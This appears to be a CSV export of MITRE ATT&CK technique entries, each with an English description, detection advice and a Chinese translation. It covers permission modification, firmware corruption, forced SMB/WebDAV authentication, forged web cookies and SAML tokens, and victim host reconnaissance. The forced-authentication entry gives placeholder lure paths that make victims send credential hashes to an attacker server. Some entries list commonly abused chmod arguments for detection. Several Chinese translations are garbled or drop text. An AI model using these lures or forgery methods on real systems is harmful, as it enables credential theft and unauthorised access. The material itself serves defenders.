T1222.002,File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).

Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",https://attack.mitre.org/techniques/T1222/002,04 February 2020,13 September 2021,1.1,Defense Evasion,"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Commonly abused command arguments include <code>chmod +x</code>, <code>chmod -R 755</code>, and <code>chmod 777</code>.(Citation: 20 macOS Common Tools and Techniques) 

Consider enabling file/directory permission change auditing on folders containing key binary/configuration files.","Linux, macOS","Command: Command Execution, File: File Metadata, Process: Process Creation",True,T1222,,,"root, User",,,,,,"(Citation: Aqua Kinsing April 2020),(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: Shlayer jamf gatekeeper bypass 2021),(Citation: Anomali Rocke March 2019),(Citation: CheckPoint Dok),(Citation: ANSSI Sandworm January 2021),(Citation: Trend Micro TeamTNT),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Leonardo Turla Penquin May 2020),(Citation: Cisco Talos Intelligence Group),(Citation: 20 macOS Common Tools and Techniques),(Citation: ESET OceanLotus macOS April 2019),",文件和目录权限修改：Linux和Mac文件和目录权限修改,攻击者可能会修改文件或目录权限/属性以逃避访问控制列表 (ACL) 并访问受保护的文件。（引文：Hybrid Analysis Icacls1 June 2018）（引文：Hybrid Analysis Icacls2 May 2018）文件和目录权限通常由配置的 ACL 管理由文件或目录所有者，或具有适当权限的用户。文件和目录 ACL 实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。大多数 Linux 和基于 Linux 的平台都提供一组标准的权限组（用户、组和其他）和一组应用于每个组的标准权限（读取、写入和执行）。虽然每个平台的权限实现的细微差别可能会有所不同，但大多数平台都提供了两个用于操作文件和目录 ACL 的主要命令：<code>chown</code>（更改所有者的缩写）和 <code>chmod</code> （更改模式的缩写）。 Adversarial 可以使用这些命令使自己成为文件和目录的所有者，或者在当前权限允许的情况下更改模式。他们随后可以将其他人锁定在文件之外。特定的文件和目录修改可能是许多技术所必需的步骤，例如通过 [Unix Shell 配置修改](https://attack.mitre.org/techniques/T1546/004) 建立持久性或污染/劫持其他工具二进制/通过 [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574) 的配置文件。（引用：20 macOS 常用工具和技术）
T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)

Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",https://attack.mitre.org/techniques/T1222/001,04 February 2020,01 September 2020,1.1,Defense Evasion,"Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.

Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)",Windows,"Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Metadata, Process: Process Creation",True,T1222,,,"Administrator, SYSTEM, User",,,,,,"(Citation: NCC Group WastedLocker June 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Microsoft PLATINUM April 2016),(Citation: Sophos New Ryuk Attack October 2020),(Citation: Cisco CaddyWiper March 2022),(Citation: ANSSI RYUK RANSOMWARE),(Citation: LogRhythm WannaCry),",文件和目录权限修改：Windows文件和目录权限修改,攻击者可能会修改文件或目录权限/属性以逃避访问控制列表 (ACL) 并访问受保护的文件。（引文：Hybrid Analysis Icacls1 June 2018）（引文：Hybrid Analysis Icacls2 May 2018）文件和目录权限通常由配置的 ACL 管理由文件或目录所有者，或具有适当权限的用户。文件和目录 ACL 实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。 Windows 将文件和目录 ACL 实现为自由访问控制列表 (DACL)。（引用：Microsoft DACL 2018 年 5 月）与标准 ACL 类似，DACL 标识允许或拒绝访问安全对象的帐户。当尝试访问安全对象时，系统会按顺序检查 DACL 中的访问控制条目。如果找到匹配的条目，则授予对该对象的访问权限。否则，访问将被拒绝。（引用：Microsoft Access Control Lists May 2018）攻击者可以使用内置的 Windows 命令与 DACL 交互，例如 `icacls`、`cacls`、`takeown` 和 `attrib`，这些命令可以授予对手对特定文件和文件夹的更高权限。此外，[PowerShell](https://attack.mitre.org/techniques/T1059/001) 提供可用于检索或修改文件和目录 DACL 的 cmdlet。对许多技术来说，特定的文件和目录修改可能是必需的步骤，例如通过 [Accessibility Features](https://attack.mitre.org/techniques/T1546/008)、[Boot or Logon Initialization Scripts](https ://attack.mitre.org/techniques/T1037），或通过[劫持执行流程]（https://attack.mitre.org/techniques/T1574）污染/劫持其他工具二进制/配置文件。
T1495,Firmware Corruption,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.

In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). ",https://attack.mitre.org/techniques/T1495,12 April 2019,31 August 2022,1.2,Impact,System firmware manipulation may be detected.(Citation: MITRE Trustworthy Firmware Measurement) Log attempts to read/write to BIOS and compare against known patching behavior.,"Linux, Network, Windows, macOS",Firmware: Firmware Modification,False,,,,,,,,Availability,,"(Citation: Secure List Bad Rabbit),(Citation: Eclypsium Trickboot December 2020),",固件损坏,攻击者可能会覆盖或破坏系统 BIOS 或连接到系统的设备中的其他固件的闪存内容，以使其无法运行或无法启动，从而拒绝使用设备和/或系统。（引用：赛门铁克Chernobyl W95.CIH) 固件是从硬件设备上的非易失性存储器加载和执行的软件，用于初始化和管理设备功能。这些设备可能包括主板、硬盘驱动器或视频卡。通常，攻击者可能会操纵、覆盖或破坏固件，以拒绝使用系统或设备。例如，负责为网络设备加载操作系统的固件损坏可能会导致网络设备无法运行。（引用：dhs_threat_to_net_devices）（引用：cisa_malware_orgs_ukraine）取决于设备，此攻击还可能导致[数据破坏]（https： //attack.mitre.org/techniques/T1485）。
T1187,Forced Authentication,"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)

Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)

There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:

* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)
* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)",https://attack.mitre.org/techniques/T1187,16 January 2018,19 June 2020,1.2,Credential Access,"Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.

Monitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)",Windows,"File: File Access, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,"Sudhanshu Chauhan, @Sudhanshu_C; Teodor Cimpoesu",User,,,,,,"(Citation: Unit 42 Phishery Aug 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Gigamon Berserk Bear October 2021),(Citation: US-CERT TA18-074A),(Citation: US-CERT SMB Security),(Citation: US-CERT APT Energy Oct 2017)",强制认证,攻击者可以通过调用或强制用户通过他们可以拦截的机制自动提供身份验证信息来收集凭证材料。服务器消息块 (SMB) 协议通常用于 Windows 网络中，用于系统之间的身份验证和通信，以访问资源和文件共享。当 Windows 系统尝试连接到 SMB 资源时，它会自动尝试进行身份验证并将当前用户的凭据信息发送到远程系统。 （引用：维基百科服务器消息块）这种行为在企业环境中很典型，因此用户无需输入凭据即可访问网络资源。当 SMB 被阻止或失败时，Windows 系统通常也将 Web 分布式创作和版本控制 (WebDAV) 用作备份协议。 WebDAV 是 HTTP 的扩展，通常在 TCP 端口 80 和 443 上运行。（引用：Didier Stevens WebDAV 流量）（引用：Microsoft 管理 WebDAV 安全）攻击者可能会利用此行为通过强制 SMB 访问用户帐户哈希/WebDAV 身份验证。攻击者可以通过鱼叉式钓鱼向用户发送附件，其中包含指向攻击者控制的外部服务器的资源链接（即[模板注入]（https://attack.mitre.org/techniques/T1221）），或者放置一个特权帐户导航路径上的特制文件（例如放置在桌面上的 .SCF 文件）或受害者可访问的可公开访问共享上的文件。当用户的系统访问不受信任的资源时，它将尝试身份验证并通过 SMB 将信息（包括用户的散列凭据）发送到攻击者控制的服务器。 （引用：GitHub Hashjacking）通过访问凭证哈希，攻击者可以执行离线 [Brute Force](https://attack.mitre.org/techniques/T1110) 破解以获得对明文凭证的访问权限。 （引用：Cylance 重定向到 SMB）有几种不同的方式可以发生这种情况。 （引用：Osanda Stealing NetNTLM Hashes）一些来自野外使用的细节包括： .mitre.org/techniques/T1221))。该文档可以包括例如类似于<code>file[:]//[remote address]/Normal.dotm</code>的请求以触发SMB请求。 （引用：US-CERT APT Energy Oct 2017） * 修改后的 .LNK 或 .SCF 文件，其图标文件名指向外部引用，例如 <code>\\[remote address]\pic.png</code>强制系统在呈现图标时加载资源以重复收集凭据。 （引用：US-CERT APT Energy 2017 年 10 月）
T1606,Forge Web Credentials,"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.

Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator)

Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)",https://attack.mitre.org/techniques/T1606,17 December 2020,12 October 2021,1.2,Credential Access,"Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Logon Session: Logon Session Creation, Web Credential: Web Credential Creation, Web Credential: Web Credential Usage",False,,,,,,,,,,",(Citation: FireEye ADFS),(Citation: Microsoft SolarWinds Customer Guidance)",伪造Web凭证,攻击者可能会伪造可用于访问 Web 应用程序或 Internet 服务的凭证材料。 Web 应用程序和服务（托管在云 SaaS 环境或本地服务器中）通常使用会话 cookie、令牌或其他材料来验证和授权用户访问。攻击者可能会生成这些凭证材料以获取对 Web 资源的访问权限。这与 [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)、[Steal Application Access Token](https://attack.mitre.org/techniques/T1528) 和其他类似的不同证书是新的并且是由对手伪造的，而不是从合法用户那里窃取或拦截的行为。 Web 凭证的生成通常需要秘密值，例如密码、[私钥](https://attack.mitre.org/techniques/T1552/004) 或其他加密种子值。（引用：GitHub AWS-ADFS-凭据生成器）一旦伪造，攻击者可以使用这些网络凭据访问资源（例如：[使用备用身份验证材料]（https://attack.mitre.org/techniques/T1550）），这可能会绕过多因素和其他身份验证保护机制。（引用：Pass The Cookie）（引用：Unit 42 Mac Crypto Cookies January 2019）（引用：Microsoft SolarWinds 客户指南）
T1606.002,Forge Web Credentials: SAML Tokens,"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)

An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.

An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)",https://attack.mitre.org/techniques/T1606/002,17 December 2020,20 September 2021,1.2,Credential Access,"This technique may be difficult to detect as SAML tokens are signed by a trusted certificate. The forging process may not be detectable since it is likely to happen outside of a defender's visibility, but subsequent usage of the forged token may be seen. Monitor for anomalous logins using SAML tokens created by a compromised or adversary generated token-signing certificate. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the certificate.(Citation: Microsoft SolarWinds Customer Guidance) Search for logins to service providers using SAML SSO which do not have corresponding 4769, 1200, and 1202 events in the Domain.(Citation: Sygnia Golden SAML)

Consider modifying SAML responses to include custom elements for each service provider. Monitor these custom elements in service provider access logs to detect any anomalous requests.(Citation: Sygnia Golden SAML)","Azure AD, Google Workspace, IaaS, Office 365, SaaS, Windows","Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication, Web Credential: Web Credential Creation, Web Credential: Web Credential Usage",True,T1606,,"Blake Strom, Microsoft 365 Defender; Jen Burns, HubSpot; Oleg Kolesnikov, Securonix",Administrator,,,,,,"(Citation: Secureworks IRON RITUAL Profile),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: AADInternals Documentation),(Citation: FireEye ADFS),(Citation: Microsoft SolarWinds Customer Guidance),(Citation: Mandiant Defend UNC2452 White Paper)",伪造Web凭证：SAML 令牌,如果对手拥有有效的 SAML 令牌签名证书，他们可以伪造具有任何权限声明和生命周期的 SAML 令牌。（引用：Microsoft SolarWinds 步骤）SAML 令牌的默认生命周期是一小时，但有效期可以在标记中 <code>conditions ...</code> 元素的 <code>NotOnOrAfter</code> 值。可以使用 <code>LifetimeTokenPolicy</code> 中的 <code>AccessTokenLifetime</code> 更改此值。（引用：Microsoft SAML 令牌生命周期）伪造的 SAML 令牌使攻击者能够跨使用 SAML 2.0 作为 SSO 的服务进行身份验证（单点登录）机制。（引用：Cyberark Golden SAML）攻击者可能利用 [私钥]（https://attack.mitre.org/techniques/T1552/004）破坏组织的令牌签名证书以创建伪造的 SAML 令牌。如果攻击者有足够的权限与他们自己的 Active Directory 联合身份验证服务 (AD FS) 服务器建立新的联合信任，他们可能会生成自己的受信任令牌签名证书。（引用：Microsoft SolarWinds 客户指南）这不同于 [窃取Application Access Token](https://attack.mitre.org/techniques/T1528) 和其他类似行为，因为令牌是新的并且是由对手伪造的，而不是从合法用户那里窃取或截获的。如果伪造声称代表高特权帐户的 SAML 令牌，攻击者可能会获得管理 Azure AD 特权。这可能会导致 [使用备用身份验证材料](https://attack.mitre.org/techniques/T1550)，这可能会绕过多因素和其他身份验证保护机制。（引用：Microsoft SolarWinds 客户指南）
T1606.001,Forge Web Credentials: Web Cookies,"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.

Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.

Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)",https://attack.mitre.org/techniques/T1606/001,17 December 2020,20 September 2021,1.1,Credential Access,"Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","IaaS, Linux, SaaS, Windows, macOS","Logon Session: Logon Session Creation, Web Credential: Web Credential Creation, Web Credential: Web Credential Usage",True,T1606,,"Jen Burns, HubSpot",,,,,,,"(Citation: Volexity SolarWinds),",伪造Web凭证：网络 Cookie,攻击者可能会伪造可用于访问 Web 应用程序或 Internet 服务的 Web cookie。 Web 应用程序和服务（托管在云 SaaS 环境或本地服务器中）通常使用会话 cookie 来验证和授权用户访问。攻击者可能会生成这些 cookie 以获取对 Web 资源的访问权限。这与 [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) 和其他类似行为的不同之处在于 cookie 是新的并且是由对手伪造的，而不是从合法用户那里窃取或截获的。大多数常见的网络应用程序都有标准化和记录的 cookie 值，可以使用提供的工具或接口生成。（引用：传递 Cookie）网络 cookie 的生成通常需要秘密值，例如密码、[私钥]（https:// attack.mitre.org/techniques/T1552/004）或其他加密种子值。一旦伪造，攻击者可能会使用这些 Web cookie 访问资源（[Web Session Cookie]（https://attack.mitre.org/techniques/T1550/004）），这可能会绕过多因素和其他身份验证保护机制。（引文：Volexity SolarWinds）（引文：传递 Cookie）（引文：Unit 42 Mac Crypto Cookies 2019 年 1 月）
T1592,Gather Victim Host Information,"Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1592,02 October 2020,17 October 2021,1.1,Reconnaissance,"Internet scanners may be used to look for patterns associated with malicious content designed to collect host information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Internet Scan: Response Content,False,,,,,,,,,,",",收集受害者主机信息,攻击者可能会收集有关受害者主机的信息，这些信息可以在定位期间使用。有关主机的信息可能包括各种详细信息，包括管理数据（例如：名称、分配的 IP、功能等）以及有关其配置的详细信息（例如：操作系统、语言等）。攻击者可以通过各种方式收集这些信息，例如通过 [主动扫描](https://attack.mitre.org/techniques/T1595) 或 [网络钓鱼获取信息](https://attack.mitre.org) 直接收集信息/技术/T1598）。攻击者还可能破坏网站，然后包含旨在从访问者那里收集主机信息的恶意内容。（引文：ATT ScanBox）有关主机的信息也可能通过在线或其他可访问的数据集（例如：[社交媒体]（https：/ /attack.mitre.org/techniques/T1593/001) 或 [搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594))。收集这些信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593) 或[搜索开放技术数据库](https://attack. mitre.org/techniques/T1596)），建立运营资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack.mitre.org /techniques/T1588)）和/或初始访问权限（例如：[供应链妥协](https://attack.mitre.org/techniques/T1195) 或[外部远程服务](https://attack.mitre.组织/技术/T1133))。
T1592.004,Gather Victim Host Information: Client Configurations,"Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1592/004,02 October 2020,17 October 2021,1.1,Reconnaissance,"Internet scanners may be used to look for patterns associated with malicious content designed to collect client configuration information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Internet Scan: Response Content,True,T1592,,,,,,,,,"(Citation: Microsoft HAFNIUM March 2020),",收集受害者主机信息：客户端配置,攻击者可能会收集有关受害者客户端配置的信息，这些信息可以在定位期间使用。有关客户端配置的信息可能包括各种详细信息和设置，包括操作系统/版本、虚拟化、架构（例如：32 位或 64 位）、语言和/或时区。攻击者可以通过多种方式收集这些信息，例如通过 [主动扫描](https://attack.mitre.org/techniques/T1595) 直接收集操作（例如：监听端口、服务器横幅、用户代理字符串）或 [网络钓鱼信息](https://attack.mitre.org/techniques/T1598)。攻击者还可能破坏站点，然后包含旨在从访问者那里收集主机信息的恶意内容。（引用：ATT ScanBox）有关客户端配置的信息也可能通过在线或其他可访问的数据集（例如：职位发布、网络地图、评估报告、简历或采购发票）。收集这些信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593) 或[搜索开放技术数据库](https://attack. mitre.org/techniques/T1596)），建立运营资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack.mitre.org /techniques/T1588)）和/或初始访问权限（例如：[供应链妥协](https://attack.mitre.org/techniques/T1195) 或[外部远程服务](https://attack.mitre.组织/技术/T1133))。
T1592.003,Gather Victim Host Information: Firmware,"Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",https://attack.mitre.org/techniques/T1592/003,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

